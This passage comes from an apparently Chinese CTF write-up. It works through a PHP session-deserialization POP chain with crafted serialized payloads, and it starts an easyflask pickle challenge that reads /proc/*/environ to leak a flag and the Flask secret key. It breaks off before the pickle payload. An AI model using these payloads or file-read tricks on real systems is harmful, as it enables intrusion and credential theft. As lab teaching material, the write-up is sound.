punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//:)</span>       <span class="token punctuation">}</span>   <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><del>这也太大胆了吧（</del></p><blockquote><p>本题的 flag 不在环境变量中，session_start（），注意链子挖掘.把我前端删了，呃呃呃，怎么还把我日志关了</p></blockquote><p><del>这record.php被删的一干二净哈哈哈</del></p><p>于是放弃命令执行,考虑去日志里找</p><blockquote><p><code>session_start()</code> 函数就是用来开启会话的，一旦会话启动，就可以在不同的页面之间存储和获取用户相关的数据。</p><h6 id="会话-ID"><a href="#会话-ID" class="headerlink" title="会话 ID"></a>会话 ID</h6><p>当调用 <code>session_start()</code> 时，PHP 会为当前用户分配一个唯一的会话 ID（通常是一个 32 位的字符串）。这个会话 ID 会通过 cookie 或者 URL 参数的方式传递给客户端浏览器。</p><h6 id="会话数据存储"><a href="#会话数据存储" class="headerlink" title="会话数据存储"></a>会话数据存储</h6><p>会话数据会存储在服务器端的文件或者数据库中，文件名或者记录的标识通常就是会话 ID。客户端每次发送请求时，会携带会话 ID，服务器根据这个 ID 来查找对应的会话数据。</p></blockquote><p>嘶，那岂不是日志一直存在唯一的用户(admin)ID对应的数据库中？我们只要进入会话中就可以操作，去看见日志</p><p>怎么看日志记录（record.php)呢？</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">public function __toString(){     if($this-&gt;data === "log_start()"){         file_put_contents("record.php","&lt;?php\nerror_reporting(0);\n");     }     return ":O"; }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>再找<code>echo</code> 语句/字符串拼接</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script&gt;alert('edit conf success\\n"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/&lt;br&gt;/'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\n'</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">showconf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"')&lt;/script&gt;"</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"uname"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"passwd"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"avatar"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"nickname"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"sex"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"mail"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"telnum"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">showconf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$show</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"&lt;img src=\"data:image/png;base64,"</span><span class="token operator">.</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">avatar</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"\"/&gt;&lt;br&gt;"</span><span class="token punctuation">;</span>        <span class="token variable">$show</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"nickname: <span class="token interpolation"><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">nickname</span></span>&lt;br&gt;"</span><span class="token punctuation">;</span>        <span class="token variable">$show</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"sex: <span class="token interpolation"><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">sex</span></span>&lt;br&gt;"</span><span class="token punctuation">;</span>        <span class="token variable">$show</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"mail: <span class="token interpolation"><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">mail</span></span>&lt;br&gt;"</span><span class="token punctuation">;</span>        <span class="token variable">$show</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"telnum: <span class="token interpolation"><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">telnum</span></span>&lt;br&gt;"</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$show</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token comment">#很难不说这两连着不显眼。。。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>Config. __sleep()=&gt;Config. showconf()=&gt;Log.__toString()</code></p><blockquote><p>当对一个对象使用 <code>serialize()</code> 函数进行序列化时，PHP 会自动检查该对象是否定义了 <code>__sleep()</code> 方法。如果定义了，就会先调用这个方法。</p></blockquote><p><code>?uname=admin&amp;passwd=1q2w3e&amp;backdoor=session_start</code></p><p>当调用 <code>session_start()</code> 时，PHP 会执行以下主要步骤：</p><blockquote><h6 id="检查会话-ID"><a href="#检查会话-ID" class="headerlink" title="检查会话 ID"></a>检查会话 ID</h6><ul><li>PHP 首先会检查客户端（通常是浏览器）是否已经发送了一个会话 ID。会话 ID 一般通过名为 <code>PHPSESSID</code> 的 cookie 或者 URL 参数传递给服务器。如果客户端没有提供会话 ID，PHP 会生成一个新的会话 ID。</li></ul><h6 id="定位会话数据存储位置"><a href="#定位会话数据存储位置" class="headerlink" title="定位会话数据存储位置"></a>定位会话数据存储位置</h6><ul><li>PHP 会根据 <code>session.save_handler</code> 和 <code>session.save_path</code> 等配置项来确定会话数据的存储位置。常见的会话数据存储方式有文件存储、数据库存储等。在默认情况下，会话数据以文件形式存储在服务器的文件系统中，文件命名格式通常为 <code>sess_&lt;session_id&gt;</code>，其中 <code>&lt;session_id&gt;</code> 就是生成或接收到的会话 ID。</li></ul><h6 id="读取并反序列化会话数据"><a href="#读取并反序列化会话数据" class="headerlink" title="读取并反序列化会话数据"></a>读取并反序列化会话数据</h6><ul><li>如果存在对应的会话文件（如 <code>sess_XXX</code>），PHP 会读取该文件的内容。会话文件中的数据是经过序列化处理的，PHP 会根据 <code>session.serialize_handler</code> 配置项指定的序列化方式（如 <code>php_serialize</code>、<code>php_binary</code> 等）对读取到的数据进行反序列化操作。</li><li>反序列化完成后，PHP 会将反序列化得到的数据填充到 <code>$_SESSION</code> 超全局数组中，而不是得到一个名为 <code>$Session</code> 的对象（在标准的 PHP 会话机制里是使用 <code>$_SESSION</code> 数组来管理会话数据）。</li></ul></blockquote><p><code>?uname=admin&amp;passwd=1q2w3e&amp;backdoor=phpinfo</code></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/2b686d0901852ac8487f2f965be7017c.png"></p><p>session.serialize_handler为php。</p><blockquote><p>php</p><ul><li>是 PHP 5.x 及早期版本的默认序列化处理程序。它采用一种特定的格式来序列化数组和对象。对于数组，会按照一定规则将键值对组合成字符串；对于对象，会存储对象的类名和属性信息。</li><li>键名+竖线（|）+经过serialize()函数处理过的值</li></ul><p>php_serialize</p><ul><li>从 PHP 7.0 开始，<code>php_serialize</code> 逐渐成为新的默认序列化处理程序。它基于 PHP 内置的 <code>serialize()</code> 和 <code>unserialize()</code> 函数工作，能更准确地处理各种复杂的数据类型，包括自定义类的对象。</li><li>经过serialize()函数处理过的值，会将键名和值当作一个数组序列化</li></ul><p>php_binary</p><ul><li>它以二进制格式来序列化会话数据，序列化后的结果是二进制字符串。</li><li>键名的长度对应的ascii字符+键名+经过serialize()函数序列化后的值</li></ul></blockquote><p>所以读取对应的会话文件的内容反序列化=&gt;<code>$_SESSION</code></p><blockquote><p><strong>序列化会话数据</strong>：PHP 会根据 <code>session.serialize_handler</code> 配置项指定的序列化方式（如 <code>php_serialize</code>、<code>php_binary</code> 等），将 <code>$_SESSION</code> 数组中的数据进行序列化。</p><p><strong>保存序列化数据</strong>：将序列化后的字符串保存到对应的会话文件中。会话文件的命名格式通常为 <code>sess_&lt;session_id&gt;</code>，存储位置由 <code>session.save_path</code> 配置项决定，默认情况下是 <code>/tmp</code> 目录。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/620fcffbedf53b5ceb10437a0396f1d3.png"></p><p>session.save_path取默认。</p><p><code>$_SESSION</code>=&gt;会话文件,进行<strong>序列化</strong>=&gt;<code>Config. __sleep()</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">《<span class="token operator">?</span>php<span class="token keyword">class</span> <span class="token class-name-definition class-name">Log</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$data</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Config</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$uname</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$passwd</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$avatar</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$nickname</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$sex</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$mail</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$telnum</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Config</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-&gt;</span><span class="token property">avatar</span><span class="token operator">=</span><span class="token variable">$b</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Log</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">-&gt;</span><span class="token property">data</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"log_start()"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>O:6:"Config":7:{s:5:"uname";N;s:6:"passwd";N;s:6:"avatar";O:3:"Log":1:{s:4:"data";N;}s:8:"nickname";N;s:3:"sex";N;s:4:"mail";N;s:6:"telnum";N;}</code></p><p>PHPSESSID=bae6cdb549e94c652632aa39240c6962，所以filename=”sess_XXX”=”sess_bae6cdb549e94c652632aa39240c6962”（当然这里随便都行，我就用它分配给我的了）</p><p>再保持键名一致即可（</p><p><code>qing|O:6:"Config":7:{s:5:"uname";N;s:6:"passwd";N;s:6:"avatar";O:3:"Log":1:{s:4:"data";s:11:"log_start()";}s:8:"nickname";N;s:3:"sex";N;s:4:"mail";N;s:6:"telnum";N;}</code></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/66f8dbc1e6f0b39019846cba3bf4a08f.png"></p><p>暂时想不到什么好方法看日志，不过用木马确实是个好办法</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">upload</span><span class="token punctuation">(</span><span class="token variable">$avatar</span><span class="token punctuation">)</span><span class="token punctuation">{</span>       <span class="token variable">$path</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/tmp/"</span><span class="token operator">.</span><span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\.\./"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$avatar</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">,</span><span class="token variable">$avatar</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fdata'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">return</span> <span class="token variable">$path</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><del><code>file_put_contents</code>也太大胆了</del>，而且路径也是/tmp目录下（这也太巧了吧，指指点点）</p><p>我还想怎么去tmp目录下呢，那就在你这儿吧（</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/085e66c7ae63688347c1ee74b199a5dc.png"></p><p>从给出的base64可得是写进去了（</p><p> <code>file_put_contents("record.php","&lt; ?php\nerror_reporting(0);\n");</code></p><p>so<strong>注意删去Cookie</strong>，防止再次写入 &lt; ?php error_reporting(0);</p><p>木马/rce即可得到<code>flag{8106a7ed-5578-47c2-a3a6-b75a1ef0c849}</code></p><hr><h3 id="HFCTF-2021-Final-easyflask"><a href="#HFCTF-2021-Final-easyflask" class="headerlink" title="[HFCTF 2021 Final]easyflask"></a>[HFCTF 2021 Final]easyflask</h3><p><code>Here is a js file. Source at /app/source</code></p><p>嗯嗯，知道了源文件的位置。<code>/file?file=/app/source</code></p><p>尝试在file后输入被告知disallowed</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python3.6</span><span class="token keyword">import</span> os<span class="token keyword">import</span> pickle<span class="token keyword">from</span> base64 <span class="token keyword">import</span> b64decode<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> sessionapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">"SECRET_KEY"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"glzjin22948575858jfjfjufirijidjitg3uiiuuh"</span><span class="token comment">#这个不吉岛</span>User <span class="token operator">=</span> <span class="token builtin">type</span><span class="token punctuation">(</span><span class="token string">'User'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>    <span class="token string">'uname'</span><span class="token punctuation">:</span> <span class="token string">'test'</span><span class="token punctuation">,</span>    <span class="token string">'is_admin'</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>    <span class="token string">'__repr__'</span><span class="token punctuation">:</span> <span class="token keyword">lambda</span> o<span class="token punctuation">:</span> o<span class="token punctuation">.</span>uname<span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">"""1. type 函数的使用在 Python 中，type 函数有两种主要的用法：当传入一个参数时，它用于返回该对象的类型，例如 type(1) 会返回 &lt;class 'int'&gt;。当传入三个参数时，它可以用于动态创建类。这三个参数分别是：类名：一个字符串，表示新创建类的名称，这里是 'User'。基类元组：一个包含基类的元组，指定新类继承自哪些类。这里 (object,) 表示 User 类继承自 object 类，在 Python 3 中，所有类默认都继承自 object 类。类属性字典：一个字典，包含类的属性和方法。这里定义了两个属性 uname 和 is_admin，以及一个特殊方法 __repr__。2. 类属性和方法uname：这是一个类属性，初始值为 'test'。可以通过类的实例访问和修改这个属性。is_admin：同样是类属性，初始值为 0，通常可以用来表示用户是否为管理员的标识。__repr__：这是一个特殊方法，用于返回对象的字符串表示形式。当你打印对象或者在交互式环境中查看对象时，会调用这个方法。这里使用了一个 lambda 函数，返回对象的 uname 属性值。"""</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'GET'</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index_handler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'u'</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#检查会话中是否存在键为 'u' 的数据</span>        u <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>User<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        session<span class="token punctuation">[</span><span class="token string">'u'</span><span class="token punctuation">]</span> <span class="token operator">=</span> u    <span class="token keyword">return</span> <span class="token string">"/file?file=index.js"</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/file'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'GET'</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">file_handler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    path <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">)</span>    path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string">'static'</span><span class="token punctuation">,</span> path<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>path<span class="token punctuation">)</span> <span class="token keyword">or</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>isdir<span class="token punctuation">(</span>path<span class="token punctuation">)</span> \            <span class="token keyword">or</span> <span class="token string">'.py'</span> <span class="token keyword">in</span> path <span class="token keyword">or</span> <span class="token string">'.sh'</span> <span class="token keyword">in</span> path <span class="token keyword">or</span> <span class="token string">'..'</span> <span class="token keyword">in</span> path <span class="token keyword">or</span> <span class="token string">"flag"</span> <span class="token keyword">in</span> path<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'disallowed'</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fp<span class="token punctuation">:</span>        content <span class="token operator">=</span> fp<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> content<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/admin'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'GET'</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">admin_handler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        u <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'u'</span><span class="token punctuation">)</span>        <span class="token triple-quoted-string string">"""session.get('u') 使用了 get 方法，这是 Python 字典（以及其他类似字典的对象）的一个常用方法。如果 'u' 键存在于 session 中，get 方法会返回对应的值；如果 'u' 键不存在，get 方法会返回 None（或者指定的默认值，这里没有提供默认值）。"""</span>        <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>u<span class="token punctuation">,</span> <span class="token builtin">dict</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            u <span class="token operator">=</span> b64decode<span class="token punctuation">(</span>u<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'b'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        u <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>u<span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'uhh?'</span>    <span class="token keyword">if</span> u<span class="token punctuation">.</span>is_admin <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'welcome, admin'</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'who are you?'</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://xz.aliyun.com/news/7032">文章 - pickle反序列化初探 - 先知社区</a></p><hr><p>试了下环境，直接爆了哈哈哈哈</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">/</span>proc<span class="token operator">/</span><span class="token number">1</span><span class="token operator">/</span>environPATH<span class="token operator">=</span><span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span><span class="token builtin">bin</span><span class="token punctuation">:</span><span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>sbin<span class="token punctuation">:</span><span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span><span class="token builtin">bin</span><span class="token punctuation">:</span><span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token punctuation">:</span><span class="token operator">/</span>usr<span class="token operator">/</span><span class="token builtin">bin</span><span class="token punctuation">:</span><span class="token operator">/</span>sbin<span class="token punctuation">:</span><span class="token operator">/</span>binHOSTNAME<span class="token operator">=</span>outFLAG<span class="token operator">=</span>flag<span class="token punctuation">{</span><span class="token number">48657e50</span><span class="token operator">-</span>c6de<span class="token operator">-</span>4a0a<span class="token operator">-</span><span class="token number">9163</span><span class="token operator">-</span>20c7fe9e6313<span class="token punctuation">}</span>KUBERNETES_PORT_443_TCP_ADDR<span class="token operator">=</span><span class="token number">10.240</span><span class="token number">.0</span><span class="token punctuation">.</span>1KUBERNETES_SERVICE_HOST<span class="token operator">=</span><span class="token number">10.240</span><span class="token number">.0</span><span class="token punctuation">.</span>1KUBERNETES_SERVICE_PORT<span class="token operator">=</span>443KUBERNETES_SERVICE_PORT_HTTPS<span class="token operator">=</span>443KUBERNETES_PORT<span class="token operator">=</span>tcp<span class="token punctuation">:</span><span class="token operator">//</span><span class="token number">10.240</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span>443KUBERNETES_PORT_443_TCP<span class="token operator">=</span>tcp<span class="token punctuation">:</span><span class="token operator">//</span><span class="token number">10.240</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span>443KUBERNETES_PORT_443_TCP_PROTO<span class="token operator">=</span>tcpKUBERNETES_PORT_443_TCP_PORT<span class="token operator">=</span>443LANG<span class="token operator">=</span>C<span class="token punctuation">.</span>UTF<span class="token operator">-</span>8GPG_KEY<span class="token operator">=</span>E3FF2839C048B25C084DEBE9B26995E310250568PYTHON_VERSION<span class="token operator">=</span><span class="token number">3.8</span><span class="token punctuation">.</span>2PYTHON_PIP_VERSION<span class="token operator">=</span><span class="token number">20.0</span><span class="token punctuation">.</span>2PYTHON_GET_PIP_URL<span class="token operator">=</span>https<span class="token punctuation">:</span><span class="token operator">//</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>pypa<span class="token operator">/</span>get<span class="token operator">-</span>pip<span class="token operator">/</span>raw<span class="token operator">/</span>d59197a3c169cef378a22428a3fa99d33e080a5d<span class="token operator">/</span>get<span class="token operator">-</span>pip<span class="token punctuation">.</span>pyPYTHON_GET_PIP_SHA256<span class="token operator">=</span>421ac1d44c0cf9730a088e337867d974b91bdce4ea2636099275071878cc189esecret_key<span class="token operator">=</span>glzjin22948575858jfjfjufirijidjitg3uiiuuhHOME<span class="token operator">=</span><span class="token operator">/</span>rootflag<span class="token punctuation">{</span><span class="token number">48657e50</span><span class="token operator">-</span>c6de<span class="token operator">-</span>4a0a<span class="token operator">-</span><span class="token number">9163</span><span class="token operator">-</span>20c7fe9e6313<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><p>正常一点：</p><p>/file?file=/proc/self/environ</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">KUBERNETES_SERVICE_PORT_HTTPS<span class="token operator">=</span><span class="token number">443</span>KUBERNETES_SERVICE_PORT<span class="token operator">=</span><span class="token number">443</span>HOSTNAME<span class="token operator">=</span>outPYTHON_VERSION<span class="token operator">=</span><span class="token number">3.8</span><span class="token number">.2</span>PWD<span class="token operator">=</span><span class="token operator">/</span>app_<span class="token operator">=</span><span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span><span class="token builtin">bin</span><span class="token operator">/</span>python3HOME<span class="token operator">=</span><span class="token operator">/</span>rootLANG<span class="token operator">=</span>C<span class="token punctuation">.</span>UTF<span class="token operator">-</span><span class="token number">8</span>KUBERNETES_PORT_443_TCP<span class="token operator">=</span>tcp<span class="token punctuation">:</span><span class="token operator">//</span><span class="token number">10.240</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">443</span>GPG_KEY<span class="token operator">=</span>E3FF2839C048B25C084DEBE9B26995E310250568FLAG<span class="token operator">=</span>flag_not_hereSHLVL<span class="token operator">=</span><span class="token number">1</span>KUBERNETES_PORT_443_TCP_PROTO<span class="token operator">=</span>tcpPYTHON_PIP_VERSION<span class="token operator">=</span><span class="token number">20.0</span><span class="token number">.2</span>KUBERNETES_PORT_443_TCP_ADDR<span class="token operator">=</span><span class="token number">10.240</span><span class="token number">.0</span><span class="token number">.1</span>PYTHON_GET_PIP_SHA256<span class="token operator">=</span>421ac1d44c0cf9730a088e337867d974b91bdce4ea2636099275071878cc189eKUBERNETES_SERVICE_HOST<span class="token operator">=</span><span class="token number">10.240</span><span class="token number">.0</span><span class="token number">.1</span>KUBERNETES_PORT<span class="token operator">=</span>tcp<span class="token punctuation">:</span><span class="token operator">//</span><span class="token number">10.240</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">443</span>KUBERNETES_PORT_443_TCP_PORT<span class="token operator">=</span><span class="token number">443</span>PYTHON_GET_PIP_URL<span class="token operator">=</span>https<span class="token punctuation">:</span><span class="token operator">//</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>pypa<span class="token operator">/</span>get<span class="token operator">-</span>pip<span class="token operator">/</span>raw<span class="token operator">/</span>d59197a3c169cef378a22428a3fa99d33e080a5d<span class="token operator">/</span>get<span class="token operator">-</span>pip<span class="token punctuation">.</span>pyPATH<span class="token operator">=</span><span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span><span class="token builtin">bin</span><span class="token punctuation">:</span><span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>sbin<span class="token punctuation">:</span><span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span><span class="token builtin">bin</span><span class="token punctuation">:</span><span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token punctuation">:</span><span class="token operator">/</span>usr<span class="token operator">/</span><span class="token builtin">bin</span><span class="token punctuation">:</span><span class="token operator">/</span>sbin<span class="token punctuation">:</span><span class="token operator">/</span><span class="token builtin">bin</span>secret_key<span class="token operator">=</span>glzjin22948575858jfjfjufirijidjitg3uiiuuhOLDPWD<span class="token operator">=</span><span class="token operator">/</span>app<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><strong>坑1</strong>：</p><p>正常来说不进行base64加密，直接将<code>{'u':b'dumps结果'}</code>生成session也可以RCE，这是因为代码方面他只是检查了u是否是dict，无论是不是字典都会进行loads操作，所以直接传序列化字符串也可以。不过这只适用于一些简单的命令，比如ls之类的，反弹shell的命令由于字符过于复杂，所以只能使用base64加密的字典格式。</p></blockquote><p>so,还是需要用字典（类属性字典）。得用User类</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span 